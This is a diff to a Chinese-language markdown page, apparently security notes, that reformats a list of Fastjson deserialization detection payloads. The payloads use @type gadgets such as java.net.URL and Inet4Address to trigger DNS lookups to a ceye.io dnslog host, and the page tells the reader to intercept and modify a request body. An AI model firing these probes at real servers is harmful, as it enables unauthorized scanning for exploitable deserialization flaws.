@@ -17,13 +17,14 @@
 
 **无回显使用dnslog探测POC：**
 
-1. `{"@type":"java.net.InetSocketAddress"{"address":,"val":"sq20yi.ceye.io"}}`
-2. `{"@type":"java.net.Inet4Address","val":"sq20yi.ceye.io"}`
-3. `{"@type":"java.net.Inet6Address","val":"sq20yi.ceye.io"}`
-4. `{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://sq20yi.ceye.io"}}""}`
-5. `Set[{"@type":"java.net.URL","val":"http://sq20yi.ceye.io"}]`
-6. `Set[{"@type":"java.net.URL","val":"http://sq20yi.ceye.io"}`
-7. `{{"@type":"java.net.URL","val":"http://sq20yi.ceye.io"}:0`
+```json
+1. {"@type":"java.net.InetSocketAddress"{"address":,"val":"sq20yi.ceye.io"}}
+2. {"@type":"java.net.Inet4Address","val":"sq20yi.ceye.io"}
+3. {"@type":"java.net.Inet6Address","val":"sq20yi.ceye.io"}
+4. {"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://sq20yi.ceye.io"}}""}
+5. Set[{"@type":"java.net.URL","val":"http://sq20yi.ceye.io"}]
+6. {"@type":"java.net.URL","val":"http://sq20yi.ceye.io"}:0
+```
 
 抓包修改请求体
 
